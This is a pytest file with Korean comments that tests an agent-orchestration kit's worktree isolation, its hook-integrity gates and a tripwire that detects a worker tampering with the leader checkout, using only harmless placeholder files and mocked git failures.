    # git 저장소가 아닌 프로젝트에서도 같은 명령이 그대로 동작해야 한다.
    # state root를 확정하지 못할 때 무조건 raise하면 non-git 사용자는 복구
    # 명령조차 쓸 수 없게 되어 같은 종류의 데드락으로 되돌아간다.
    plain = tmp_path / "not-a-repo"
    plain.mkdir()
    for argv in (
        ["status", "--root", "."],
        ["worktree", "list", "--root", "."],
        ["abort", "--root", "."],
    ):
        result = _cli(argv, cwd=plain)
        assert result.returncode == 0, f"{argv} blocked in non-git: {result.stdout}{result.stderr}"


def test_recovery_commands_survive_a_hook_integrity_violation(tmp_path):
    """불변: 런 시작 게이트가 막는 상태에서도 복구 명령은 통과한다.

    tripwire 오염만 검사하던 위 테스트는 이 실패 유형을 안 덮는다. 게이트를
    새로 추가할 때마다 §10.2가 조용히 깨질 수 있으므로 오염 유형을 함께 늘린다.
    """
    project = tmp_path / "proj"
    project.mkdir()
    node = shutil.which("node")
    if node is None:
        pytest.skip("node is required")
    kit = Path(__file__).resolve().parents[1] / "bin" / "agent-flow-kit.mjs"
    installed = subprocess.run(
        (node, str(kit), "install"), cwd=project, capture_output=True, text=True
    )
    assert installed.returncode == 0, installed.stderr
    _init_repo(project)

    # #102가 실증한 붕괴 경로 그대로: 읽기 hook 등록만 지운다.
    settings_path = project / ".claude" / "settings.json"
    settings = json.loads(settings_path.read_text(encoding="utf-8"))
    settings["hooks"]["PostToolUse"] = [
        entry
        for entry in settings["hooks"]["PostToolUse"]
        if not any("record-skill-read.py" in hook["command"] for hook in entry["hooks"])
    ]
    settings_path.write_text(json.dumps(settings, indent=2), encoding="utf-8")

    for argv in (
        ["status", "--root", "."],
        ["worktree", "list", "--root", "."],
        ["abort", "--root", "."],
    ):
        result = _cli(argv, cwd=project)
        assert result.returncode == 0, f"{argv} blocked: {result.stdout}{result.stderr}"

    # 반증: 같은 오염에서 런은 반드시 막힌다. 막히지 않으면 위 통과는 무의미하다.
    blocked = _cli(["run", "demo task", "--root", "."], cwd=project)
    assert blocked.returncode == 2, blocked.stdout
    assert "managed hook registration" in blocked.stderr


def test_run_rejects_install_with_hooks_explicitly_disabled(tmp_path):
    project = tmp_path / "proj"
    project.mkdir()
    node = shutil.which("node")
    if node is None:
        pytest.skip("node is required")
    kit = Path(__file__).resolve().parents[1] / "bin" / "agent-flow-kit.mjs"
    installed = subprocess.run(
        (node, str(kit), "install", "--no-hooks"),
        cwd=project,
        capture_output=True,
        text=True,
    )
    assert installed.returncode == 0, installed.stderr
    _init_repo(project)

    blocked = _cli(["run", "demo task", "--root", "."], cwd=project)

    assert blocked.returncode == 2, blocked.stdout
    assert "managed enforcement hooks are not enabled" in blocked.stderr
    assert len(W.list_registered_worktrees(project)) == 1


@pytest.mark.skipif(
    sys.platform != "darwin" or not Path("/usr/bin/sandbox-exec").is_file(),
    reason="macOS sandbox-exec confinement is required",
)
def test_multi_review_reviewer_env_is_sanitized(tmp_path, monkeypatch):
    """불변: reviewer 자식 프로세스는 오염된 Git discovery env를 물려받지 않는다."""
    from agent_flow import multi_review as MR
    from agent_flow.cli_detect import CliInfo

    _init_repo_with_managed_hooks(tmp_path)
    plan = W.plan_worktree(root=tmp_path, name="multi-review")
    status = W.create_worktree(root=tmp_path, plan=plan)
    linked = status.path
    out = linked / "angle.md"
    probe = (
        "import os,subprocess\n"
        f"names={W_ISO.LEAKY_GIT_ENV_VARS!r}\n"
        "top=subprocess.run(['git','rev-parse','--show-toplevel'],capture_output=True,text=True).stdout.strip()\n"
        "leaks=','.join(name for name in names if name in os.environ)\n"
        "print('LEAKS=%s' % (leaks or '<none>'))\n"
        "print('TOP=%s' % os.path.realpath(top) if top else 'TOP=')\n"
    )
    fake = CliInfo(
        name="probe",
        binaries=(sys.executable,),
        invoke=("-c", probe, "--prompt"),
    )
    monkeypatch.setattr(MR, "cli_by_name", lambda name: fake)
    for name in W_ISO.LEAKY_GIT_ENV_VARS:
        monkeypatch.setenv(name, str(tmp_path / f"poison-{name}"))

    distribution = MR.Distribution(
        by_cli={
            "probe": [
                MR.ReviewerJob(
                    angle_id="a1",
                    prompt="review",
                    output_path=out,
                    artifact_root=out.parent,
                )
            ]
        },
        host="probe",
    )
    results = MR.run_distribution(distribution, linked, timeout_s=60)

    assert len(results) == 1
    assert results[0].ok
    rendered = out.read_text(encoding="utf-8")
    assert "LEAKS=<none>" in rendered
    assert f"TOP={real_path(linked)}" in rendered


def test_multi_review_rejects_non_linked_cwd_before_spawn(
    tmp_path, monkeypatch
):
    from agent_flow import multi_review as MR
    from agent_flow.cli_detect import CliInfo
    from agent_flow import subprocess_pool as POOL

    _init_repo_with_managed_hooks(tmp_path)
    out = tmp_path / "angle.md"
    fake = CliInfo(
        name="probe",
        binaries=(sys.executable,),
        invoke=("-c", "print('spawned')", "--prompt"),
    )
    monkeypatch.setattr(MR, "cli_by_name", lambda name: fake)
    launches = []

    async def forbidden_spawn(*args, **kwargs):
        launches.append((args, kwargs))
        raise AssertionError("reviewer command was spawned")

    monkeypatch.setattr(POOL.asyncio, "create_subprocess_exec", forbidden_spawn)
    distribution = MR.Distribution(
        by_cli={
            "probe": [
                MR.ReviewerJob(
                    angle_id="a1",
                    prompt="review",
                    output_path=out,
                    artifact_root=out.parent,
                )
            ]
        },
        host="host-cli",
    )
    results = MR.run_distribution(distribution, tmp_path, timeout_s=60)

    # 지켜야 하는 불변식은 "spawn하지 않는다"다. 거부 사유는 플랫폼이 정한다 —
    # write-sandbox가 없는 OS에서는 cwd를 관측하기 전에 backend가 먼저 막는다.
    expected_error = (
        "external providers require a verified linked worktree cwd"
        if sys.platform == "darwin"
        else "no verified provider write-sandbox backend for this operating system"
    )
    assert len(results) == 1
    assert results[0].error == expected_error
    assert launches == []
    assert expected_error in out.read_text(encoding="utf-8")


def test_run_blocks_when_git_state_unknown(tmp_path, monkeypatch):
    """불변: git 상태를 확정 못 하면 run은 leader에서 격리 없이 진행하지 않는다."""
    import contextlib
    import io

    from agent_flow import cli as CLI

    _init_repo(tmp_path)

    monkeypatch.setattr(CLI, "git_repo_state", lambda _root: "unknown")
    stderr = io.StringIO()
    with contextlib.redirect_stderr(stderr):
        code = CLI.main(["run", "some task", "--root", str(tmp_path)])
    # 예전 `_is_git_repo`는 timeout을 non-git으로 접어 leader에서 그대로 달렸다.
    assert code == 2
    assert "cannot determine git repo state" in stderr.getvalue()
    # falsification: 막혔다면 leader에 run 상태가 만들어졌을 리 없다.
    assert not (tmp_path / ".agent-flow" / "runs").exists()


def test_reused_worktree_is_verified(tmp_path):
    """불변: 기존 경로 재사용도 생성과 같은 증명을 거친다 — 남의 저장소 worktree는 거부."""
    leader = tmp_path / "leader"
    leader.mkdir()
    _init_repo(leader)
    plan = W.plan_worktree(root=leader, name="reused")

    # 정상 재사용은 통과해야 한다(회귀 방지).
    first = W.create_worktree(root=leader, plan=plan)
    again = W.create_worktree(root=leader, plan=plan)
    assert real_path(again.path) == real_path(first.path)

    # 같은 경로를 다른 저장소의 worktree로 바꿔치기한다. `.git`이 있다는
    # 사실만 보던 예전 재사용 분기는 이걸 그대로 받아들였다.
    W.remove_worktree(root=leader, status=first, allow_unmerged=True)
    intruder = tmp_path / "intruder"
    intruder.mkdir()
    _init_repo(intruder)
    assert _git("worktree", "add", "-b", plan.branch, str(plan.path), cwd=intruder).returncode == 0
    assert (plan.path / ".git").is_file()

    with pytest.raises(WorktreeIsolationError):
        W.create_worktree(root=leader, plan=plan)


def test_normalized_name_reuses_the_same_worktree(tmp_path):
    """불변: 같은 worktree를 가리키는 표기 차이는 재사용이고, 격리는 unique 토큰이 보장한다."""
    _init_repo(tmp_path)
    first = W.plan_worktree(root=tmp_path, name="Fix Bug")
    second = W.plan_worktree(root=tmp_path, name="fix-bug")
    assert first.path == second.path
    created = W.create_worktree(root=tmp_path, plan=first)

    # resume 경로는 정규화된 이름으로 다시 들어온다. 이걸 막으면 재개 자체가 불가능하다.
    reused = W.create_worktree(root=tmp_path, plan=second, allow_dirty=True)
    assert real_path(reused.path) == real_path(created.path)

    # falsification: 동시 워커 격리는 unique 토큰이 만든다. 토큰이 다르면 트리도 달라야 한다.
    forked = W.plan_worktree(root=tmp_path, name="Fix Bug", unique="w2")
    assert forked.path != first.path
    forked_status = W.create_worktree(root=tmp_path, plan=forked, allow_dirty=True)
    assert real_path(forked_status.path) != real_path(created.path)


def test_repository_global_capacity_serializes_processes(tmp_path):
    _init_repo(tmp_path)
    ready = tmp_path / "lease-ready"
    stop = tmp_path / "lease-stop"
    holder_code = (
        "import sys, time\n"
        "from pathlib import Path\n"
        "from agent_flow.core.worktree_isolation import provider_lease\n"
        "root, ready, stop = map(Path, sys.argv[1:4])\n"
        "with provider_lease(root, capacity=1):\n"
        "    ready.write_text('ready', encoding='utf-8')\n"
        "    while not stop.exists(): time.sleep(0.01)\n"
    )
    env = dict(os.environ)
    env["PYTHONPATH"] = SRC
    holder = subprocess.Popen(
        [sys.executable, "-c", holder_code, str(tmp_path), str(ready), str(stop)],
        cwd=tmp_path,
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    deadline = time.monotonic() + 5
    while not ready.exists() and holder.poll() is None and time.monotonic() < deadline:
        time.sleep(0.01)
    assert ready.exists(), holder.communicate(timeout=1)[1]
    assert probe_provider_leases(tmp_path) == "active"

    contender_code = (
        "import sys\n"
        "from pathlib import Path\n"
        "from agent_flow.core.worktree_isolation import "
        "ProviderLeaseUnavailable, provider_lease\n"
        "try:\n"
        "    with provider_lease(Path(sys.argv[1]), capacity=1): pass\n"
        "except ProviderLeaseUnavailable:\n"
        "    raise SystemExit(23)\n"
    )
    blocked = subprocess.run(
        [sys.executable, "-c", contender_code, str(tmp_path)],
        cwd=tmp_path,
        env=env,
        capture_output=True,
        text=True,
    )
    assert blocked.returncode == 23, blocked.stderr

    stop.write_text("stop", encoding="utf-8")
    holder_stdout, holder_stderr = holder.communicate(timeout=5)
    assert holder.returncode == 0, holder_stdout + holder_stderr
    assert probe_provider_leases(tmp_path) == "inactive"
    acquired = subprocess.run(
        [sys.executable, "-c", contender_code, str(tmp_path)],
        cwd=tmp_path,
        env=env,
        capture_output=True,
        text=True,
    )
    assert acquired.returncode == 0, acquired.stderr


def test_state_root_refuses_to_fall_back_into_the_leader(tmp_path, monkeypatch):
    """불변: git 저장소인데 common dir을 못 읽으면 state root를 leader 안에 두지 않고 멈춘다."""
    from agent_flow.core.commands import SafeCommandResult

    _init_repo(tmp_path)
    real_git_safe = W.git_safe

    def _no_common_dir(*args, **kwargs):
        if args[:2] == ("rev-parse", "--git-common-dir"):
            return SafeCommandResult(
                args=("git",), returncode=None, stdout="", stderr="timed out", timed_out=True
            )
        return real_git_safe(*args, **kwargs)

    monkeypatch.setattr(W, "git_safe", _no_common_dir)
    # 폴백하면 워커 상태가 leader 체크아웃 안에 쌓여 격리가 조용히 무너진다.
    with pytest.raises(RuntimeError) as refused:
        W.worktree_runtime_root(root=tmp_path, name="anything")
    assert "leader checkout" in str(refused.value)


def test_tripwire_watches_installed_runtime_code(tmp_path):
    """불변: `.agent-flow/runtime/`은 gate가 PYTHONPATH 최우선으로 실행하는 코드다.

    상태 디렉터리라고 통째로 빼면 tripwire 자기 자신을 포함한 런타임 전체가
    사각지대가 된다. 정당하게 생기는 것은 bytecode뿐이다.
    """
    status, before = _isolated(tmp_path, "runtime")
    planted = tmp_path / ".agent-flow" / "runtime" / "python" / "agent_flow" / "runner.py"
    planted.parent.mkdir(parents=True, exist_ok=True)
    planted.write_text("import os\n", encoding="utf-8")
    with pytest.raises(W_ISO.WorktreeIsolationError):
        W_ISO.assert_leader_unchanged(tmp_path, before)


def test_tripwire_ignores_generated_bytecode(tmp_path):
    """불변: `__pycache__`/`.pyc`는 실행하면 저절로 생긴다. 오탐이면 안 된다."""
    status, before = _isolated(tmp_path, "pyc")
    cache = tmp_path / ".agent-flow" / "runtime" / "python" / "agent_flow" / "__pycache__"
    cache.mkdir(parents=True, exist_ok=True)
    (cache / "runner.cpython-312.pyc").write_bytes(b"\x00bytecode\n")
    W_ISO.assert_leader_unchanged(tmp_path, before)


def test_tripwire_detects_bytecode_written_outside_runtime(tmp_path):
    """불변: 일반 project 경로의 bytecode 쓰기는 leader 누출이지 runtime 상태가 아니다."""
    _, before = _isolated(tmp_path, "project-pyc")
    cache = tmp_path / "src" / "pkg" / "__pycache__"
    cache.mkdir(parents=True)
    (cache / "module.cpython-312.pyc").write_bytes(b"\x00leaked-bytecode\n")

    with pytest.raises(W_ISO.WorktreeIsolationError):
        W_ISO.assert_leader_unchanged(tmp_path, before)


def test_tripwire_ignores_every_declared_state_dir(tmp_path):
    """불변: `AGENT_FLOW_STATE_DIRS`는 `artifacts.init_project`와 같은 소스다.

    갈라지면 정상 명령(handoff, team, memory 쓰기)이 leader 오염으로 오탐된다.
    """
    status, before = _isolated(tmp_path, "statedirs")
    for name in W_ISO.AGENT_FLOW_STATE_DIRS:
        target = tmp_path / ".agent-flow" / name / "written.md"
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text("x\n", encoding="utf-8")
    W_ISO.assert_leader_unchanged(tmp_path, before)


def test_state_dirs_match_artifacts_init(tmp_path):
    """불변: agent-flow가 실제로 쓰는 상태 디렉터리 전부가 제외 목록에 있다.

    목록을 그대로 순회하는 검사는 항목이 빠져도 통과한다(자기참조). 그래서
    기대값을 여기에 못박는다. 새 상태 디렉터리를 만들면 이 테스트가 먼저 깨진다.
    """
    from agent_flow.core import artifacts

    expected = {"runs", "state", "handoffs", "team", "archive", "context", "memory", "worktrees"}
    assert set(W_ISO.AGENT_FLOW_STATE_DIRS) == expected

    artifacts.init_project(tmp_path)
    created = {p.name for p in (tmp_path / ".agent-flow").iterdir() if p.is_dir()}
    assert expected <= created


def test_tripwire_sees_inside_gitignored_agent_flow(tmp_path):
    """불변: `.agent-flow/`가 gitignore돼도 안쪽 코드 변경은 보인다.

    `--ignored=matching`은 ignore 패턴에 직접 걸린 디렉터리를 한 줄로 접는다.
    심층 스캔(pathspec)이 없으면 그 안쪽이 통째로 사각지대가 된다 — 실제
    프로젝트가 정확히 이 배치다.
    """
    status, before = _isolated(tmp_path, "deep")
    assert ".agent-flow/" in (tmp_path / ".gitignore").read_text(encoding="utf-8")
    planted = tmp_path / ".agent-flow" / "scripts" / "hooks" / "sneaky.sh"
    planted.parent.mkdir(parents=True, exist_ok=True)
    planted.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
    with pytest.raises(W_ISO.WorktreeIsolationError):
        W_ISO.assert_leader_unchanged(tmp_path, before)
def test_tripwire_detects_arbitrary_ignored_rewrite_with_restored_mtime(tmp_path):
    target = tmp_path / ".scratch" / "cache.bin"
    target.parent.mkdir(parents=True)
    target.write_bytes(b"before")
    (tmp_path / ".gitignore").write_text(
        ".agent-flow/\n.scratch/\n",
        encoding="utf-8",
    )
    _init_repo(tmp_path)
    W.create_worktree(
        root=tmp_path,
        plan=W.plan_worktree(root=tmp_path, name="ignored-rewrite"),
    )
    before = capture_leader_snapshot(tmp_path)
    original_times = target.stat()

    target.write_bytes(b"after!")
    os.utime(
        target,
        ns=(original_times.st_atime_ns, original_times.st_mtime_ns),
    )

    with pytest.raises(W_ISO.WorktreeIsolationError):
        W_ISO.assert_leader_unchanged(tmp_path, before)




def test_tripwire_ignores_the_folded_agent_flow_record(tmp_path):
    """불변: 접힌 `!! .agent-flow/` 한 줄은 비교에서 뺀다.

    심층 스캔이 안을 파일 단위로 이미 보고하므로 정보가 없고, 디렉터리가
    처음 생기는 것만으로 변화가 생겨 정상 동작이 오탐이 된다.
    """
    tmp_path.joinpath("x.txt").write_text("x\n", encoding="utf-8")
    _init_repo(tmp_path)
    (tmp_path / ".gitignore").write_text(".agent-flow/\n", encoding="utf-8")
    _git("add", ".gitignore", cwd=tmp_path)
    _git("commit", "-m", "ignore", cwd=tmp_path)
    before = W_ISO.capture_leader_snapshot(tmp_path)
    assert not (tmp_path / ".agent-flow").exists()
    runs = tmp_path / ".agent-flow" / "runs" / "default" / "r1"
    runs.mkdir(parents=True)
    (runs / "meta.json").write_text("{}\n", encoding="utf-8")
    W_ISO.assert_leader_unchanged(tmp_path, before)


@pytest.mark.parametrize(
    "relative",
    [
        ".venv/bin/agent-flow",
        "node_modules/.bin/tsc",
        ".claude/settings.json",
        ".claude/settings.local.json",
        ".claude/hooks/pre.sh",
        ".Codex/hooks.json",
        ".codex/hooks.json",
        ".omp/config.json",
        ".omp/extensions/agent-flow-hooks.ts",
        ".scratch/cache.bin",
    ],
)
def test_tripwire_detects_execution_surface_replacement(tmp_path, relative):
    """불변: 다음 phase가 **실행할** 것을 바꾸면 잡힌다.

    실측 BLIND였던 자리다. `command -v agent-flow`가 `.venv/bin/agent-flow`이고,
    host의 PreToolUse 등록 파일은 이 저장소에서 하나도 tracked가 아니다.
    """
    target = tmp_path / relative
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("original\n", encoding="utf-8")
    (tmp_path / ".gitignore").write_text(
        ".agent-flow/\n.venv/\nnode_modules/\n.claude/\n.Codex/\n.codex/\n.omp/\n",
        encoding="utf-8",
    )
    _git("add", ".gitignore", cwd=tmp_path)
    _init_repo(tmp_path)
    plan = W.plan_worktree(root=tmp_path, name="exec")
    W.create_worktree(root=tmp_path, plan=plan)
    before = capture_leader_snapshot(tmp_path)

    target.write_text("replaced by the worker\n", encoding="utf-8")
    with pytest.raises(W_ISO.WorktreeIsolationError):
        W_ISO.assert_leader_unchanged(tmp_path, before)


def test_tripwire_ignores_agent_flow_runtime_state_in_tracked_diff(tmp_path):
    """반증: `.agent-flow/`가 git-tracked인 프로젝트에서 완료된 task가 failed로 되돌아갔다.

    `_status_records`에만 제외가 걸려 있고 `git diff HEAD`에는 pathspec이 없어서,
    agent-flow 자신의 `claim_task` 상태 쓰기가 tracked-content digest를 바꿨다.
    """
    _init_repo(tmp_path)
    state_file = tmp_path / ".agent-flow" / "state" / "team.json"
    state_file.parent.mkdir(parents=True, exist_ok=True)
    state_file.write_text('{"tasks": []}\n', encoding="utf-8")
    _git("add", "-A", cwd=tmp_path)
    _git("commit", "-m", "track agent-flow state", cwd=tmp_path)
    plan = W.plan_worktree(root=tmp_path, name="state")
    W.create_worktree(root=tmp_path, plan=plan)
    before = capture_leader_snapshot(tmp_path)

    state_file.write_text('{"tasks": [{"id": "T1", "status": "in_progress"}]}\n', encoding="utf-8")
    W_ISO.assert_leader_unchanged(tmp_path, before)

    # 무장 해제가 아니다. 같은 실행에서 진짜 소스 변경은 여전히 잡힌다.
    (tmp_path / "f.txt").write_text("worker leak\n", encoding="utf-8")
    with pytest.raises(W_ISO.WorktreeIsolationError):
        W_ISO.assert_leader_unchanged(tmp_path, before)


_LOCK_STDERR = (
    "fatal: Unable to create '/leader/.git/index.lock': File exists.\n"
    "Another git process seems to be running in this repository."
)


def _git_result(*, returncode=0, stdout="", stderr="", timed_out=False, error=None):
    return SafeCommandResult(
        args=("git",), returncode=returncode, stdout=stdout, stderr=stderr,
        timed_out=timed_out, error=error,
    )


def _patch_isolation_sleep(monkeypatch, on_sleep):
    """`worktree_isolation`이 부르는 sleep만 가로챈다.

    `W_ISO.time`의 속성을 갈아끼우면 그건 전역 `time` 모듈이라 CPython
    `subprocess`가 자식 종료를 기다리며 도는 폴링(0.0005s에서 배로 늘려 0.05s로
    캡)까지 함께 잡힌다. 관측 대상이 아닌 sleep이 섞여 backoff 단언이 깨지고,
    폴링이 no-op이 되어 수천 번 공회전한다. 모듈 참조만 바꿔 범위를 가둔다.
    """
    monkeypatch.setattr(
        W_ISO, "time", SimpleNamespace(sleep=on_sleep, monotonic=time.monotonic)
    )


def _intercept_git_safe(monkeypatch, respond):
    """`git_safe`를 가로챈다. `respond(args, n)`이 None을 주면 진짜 git이 답한다.

    tripwire는 한 관측에서 git을 여러 번 부르므로, 특정 호출만 골라 실패시키고
    나머지는 진짜 저장소를 읽게 해야 부분 실패를 재현할 수 있다.
    """
    real = W_ISO.git_safe
    calls: list[tuple] = []

    def _fake(*args, **kwargs):
        calls.append(args)
        canned = respond(args, len(calls))
        return real(*args, **kwargs) if canned is None else canned

    monkeypatch.setattr(W_ISO, "git_safe", _fake)
    return calls


@pytest.mark.parametrize(
    "canned, marker",
    [
        (dict(returncode=None, stderr="command timed out after 120s", timed_out=True), "timed out"),
        (dict(returncode=None, stderr="[Errno 2] git not found",
              error="[Errno 2] git not found"), "could not run git"),
        (dict(returncode=128, stderr="fatal: bad object HEAD"), "git exited 128"),
    ],
    ids=["timeout", "spawn-failure", "nonzero-exit"],
)
def test_git_fact_fails_closed_with_a_distinct_diagnostic(tmp_path, monkeypatch, canned, marker):
    """불변: git이 대답하지 못하면 빈 사실을 지어내지 않는다.

    반증: non-zero exit만 검사에서 빠져 있었다. `rev-parse HEAD`는 unborn/broken
    HEAD에서 stdout으로 `HEAD`를 뱉으며 128로 죽는데, 예전 코드는 그 쓰레기를
    leader 기준선으로 굳혀 다음 비교를 통째로 무의미하게 만들었다.
    """
    _init_repo(tmp_path)
    _intercept_git_safe(
        monkeypatch,
        lambda args, _n: _git_result(**canned)
        if args[0] == "rev-parse" and "--git-dir" not in args else None,
    )
    with pytest.raises(WorktreeIsolationError) as failed:
        capture_leader_snapshot(tmp_path)

    message = str(failed.value)
    # 목적 / leader 경로 / 원문이 모두 남아야 사람이 어디를 고칠지 안다.
    assert "git rev-parse HEAD" in message
    assert str(tmp_path) in message
    assert canned["stderr"] in message
    # 세 실패 모드는 진단 문자열로 구분된다.
    assert marker in message
    assert not [
        other
        for other in ({"timed out", "could not run git", "git exited 128"} - {marker})
        if other in message
    ]


def test_git_fact_accepts_a_valid_empty_answer(tmp_path):
    """불변: 빈 stdout 자체는 오류가 아니다. 성패는 오직 return code가 가른다."""
    _init_repo(tmp_path)
    _git("checkout", "--detach", cwd=tmp_path)
    # detached HEAD에서 `branch --show-current`의 정답은 exit 0 + 빈 문자열이다.
    assert W_ISO._git_fact(tmp_path, "branch", "--show-current") == ""
    assert W_ISO._git_fact(tmp_path, "rev-parse", "HEAD")


def test_non_git_project_disarms_before_any_git_fact(tmp_path, monkeypatch):
    """회귀: 비-git 프로젝트는 `_git_fact` fail-closed 앞에서 무장 해제된다.

    disarm 판정이 `_git_fact` 뒤로 밀리면 git 없는 사용자가 모든 phase에서
    막힌다 — 지킬 leader가 없는데 fail-closed가 걸리는 셈이다.
    """
    def _must_not_run(*args, **kwargs):
        raise AssertionError("disarm 판정이 _git_fact 뒤로 밀렸다")

    monkeypatch.setattr(W_ISO, "_git_fact", _must_not_run)
    snapshot = capture_leader_snapshot(tmp_path)
    assert snapshot.armed is False
    assert_leader_unchanged(tmp_path, snapshot)


def test_tripwire_snapshot_ignores_helper_rebinding_during_capture(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
):
    _init_repo(tmp_path)
    expected_head = _git("rev-parse", "HEAD", cwd=tmp_path).stdout.strip()
    expected_status = W_ISO._leader_status(tmp_path, include_ignored=True)
    real_retry = W_ISO.with_git_lock_retry

    def injecting_retry(operation, *, is_retryable):
        monkeypatch.setattr(W_ISO, "_git_fact", lambda *_args: "forged")
        monkeypatch.setattr(
            W_ISO,
            "_leader_status",
            lambda *_args, **_kwargs: "forged",
        )
        return real_retry(operation, is_retryable=is_retryable)

    monkeypatch.setattr(W_ISO, "with_git_lock_retry", injecting_retry)
    snapshot = capture_leader_snapshot(tmp_path)

    assert snapshot.head == expected_head
    assert snapshot.branch == "main"
    assert snapshot.status == expected_status


def test_tripwire_retries_transient_git_lock_contention(tmp_path, monkeypatch):
    """불변: 일시적 `.git/index.lock` 경합은 관측을 다시 찍어 넘긴다.

    반증: 경합 하나가 그대로 `WorktreeIsolationError`로 올라가면 `cli.py`가
    정상 완료된 워커 결과를 `fail_task`로 되돌린다.
    """
    _init_repo(tmp_path)
    _patch_isolation_sleep(monkeypatch, lambda _s: None)
    contended: list[tuple] = []

    def _respond(args, _n):
        if args[0] == "status" and len(contended) < 2:
            contended.append(args)
            return _git_result(returncode=128, stderr=_LOCK_STDERR)
        return None

    calls = _intercept_git_safe(monkeypatch, _respond)
    snapshot = capture_leader_snapshot(tmp_path)

    assert snapshot.armed and snapshot.head and snapshot.branch == "main"
    assert len(contended) == 2
    # 재시도 단위는 개별 git 호출이 아니라 관측 전체다. HEAD도 attempt마다 다시
    # 찍혀야 서로 다른 순간의 반쪽 상태가 기준선으로 굳지 않는다.
    assert len([c for c in calls if c[:2] == ("rev-parse", "HEAD")]) == 3

    # phase 종료 검증도 같은 경합을 넘긴다 — task가 실패로 되돌아가지 않는다.
    contended.clear()
    assert_leader_unchanged(tmp_path, snapshot)
    assert len(contended) == 2


def test_tripwire_gives_up_on_persistent_lock_contention(tmp_path, monkeypatch):
    """불변: 경합이 풀리지 않으면 무한히 돌지 않고 원래 진단을 살린 채 멈춘다."""
    _init_repo(tmp_path)
    sleeps: list[float] = []
    _patch_isolation_sleep(monkeypatch, sleeps.append)
    calls = _intercept_git_safe(
        monkeypatch,
        lambda args, _n: _git_result(returncode=128, stderr=_LOCK_STDERR)
        if args[0] == "status" else None,
    )
    with pytest.raises(WorktreeIsolationError) as failed:
        capture_leader_snapshot(tmp_path)

    # 마지막 git 진단이 retry 껍데기에 가려지면 사람이 원인을 못 본다.
    assert "cannot read leader working tree status" in str(failed.value)
    assert "index.lock" in str(failed.value)
    assert len([c for c in calls if c[0] == "status"]) == W_ISO._GIT_LOCK_RETRY_ATTEMPTS
    assert sleeps == [
        W_ISO._GIT_LOCK_RETRY_BASE_DELAY_S * (2 ** i)
        for i in range(W_ISO._GIT_LOCK_RETRY_ATTEMPTS - 1)
    ]


def test_tripwire_does_not_retry_a_non_lock_git_failure(tmp_path, monkeypatch):
    """불변: lock 경합이 아닌 git 오류는 다시 물어도 같은 답이므로 즉시 멈춘다."""
    _init_repo(tmp_path)
    _patch_isolation_sleep(monkeypatch, lambda _s: pytest.fail("non-lock 오류를 재시도했다"))
    calls = _intercept_git_safe(
        monkeypatch,
        lambda args, _n: _git_result(returncode=128, stderr="fatal: not a valid object name")
        if args[0] == "status" else None,
    )
    with pytest.raises(WorktreeIsolationError):
        capture_leader_snapshot(tmp_path)
    assert len([c for c in calls if c[0] == "status"]) == 1


def test_tripwire_reports_a_real_leader_diff_without_retrying(tmp_path, monkeypatch):
    """불변: 진짜 격리 위반은 retry에 지연되거나 삼켜지지 않는다.

    재시도 대상은 **관측**이지 관측 결과가 아니다. diff를 재시도하면 위반이
    backoff만큼 늦게 보고되고, 그 사이 leader가 다시 바뀌면 아예 사라진다.
    """
    _init_repo(tmp_path)
    before = capture_leader_snapshot(tmp_path)
    (tmp_path / "f.txt").write_text("worker leak\n", encoding="utf-8")
    _patch_isolation_sleep(monkeypatch, lambda _s: pytest.fail("실제 diff를 재시도했다"))
    observed: list = []
    monkeypatch.setattr(
        W_ISO,
        "_leader_status",
        lambda root, *, include_ignored=True, _real=W_ISO._leader_status: (
            observed.append(root)
            or _real(root, include_ignored=include_ignored)
        ),
    )
    with pytest.raises(WorktreeIsolationError) as failed:
        assert_leader_unchanged(tmp_path, before)

    assert "leader checkout changed during the phase" in str(failed.value)
    assert len(observed) == 1


def test_tripwire_retry_predicate_only_fires_on_lock_contention():
    """불변: 재시도 판정은 tripwire의 lock 경합 원문에서만 참이다."""
    from agent_flow.core.hook_integrity import HookIntegrityError

    assert W_ISO.tripwire_git_lock_retryable(
        WorktreeIsolationError(f"cannot read leader working tree status: {_LOCK_STDERR}")
    )
    assert not W_ISO.tripwire_git_lock_retryable(
        WorktreeIsolationError("leader checkout changed during the phase: HEAD moved a -> b")
    )
    # 같은 문구를 실어도 tripwire 관측 실패가 아니면 재시도 대상이 아니다.
    assert not W_ISO.tripwire_git_lock_retryable(HookIntegrityError(_LOCK_STDERR))


def test_managed_worktree_context_tolerates_a_missing_checkout_name() -> None:
    """`<marker>/worktrees`로 끝나는 경로에는 이름이 없다. 무가드로 읽으면 IndexError다."""
    from agent_flow.cli import _managed_worktree_context

    with tempfile.TemporaryDirectory() as temp_dir:
        container = Path(temp_dir) / "proj" / ".agent-flow" / "worktrees"
        container.mkdir(parents=True)
        assert _managed_worktree_context(container) == (container.parent.parent.resolve(), None)
        checkout = container / "foo"
        checkout.mkdir()
        assert _managed_worktree_context(checkout) == (container.parent.parent.resolve(), "foo")


def test_checkout_identity_never_emits_a_literal_none() -> None:
    """`worktree:None`이 나가면 하류가 그걸 checkout 이름으로 받는다."""
    from agent_flow.cli import _checkout_identity

    assert _checkout_identity(None) == "leader"
    assert _checkout_identity("foo") == "worktree:foo"
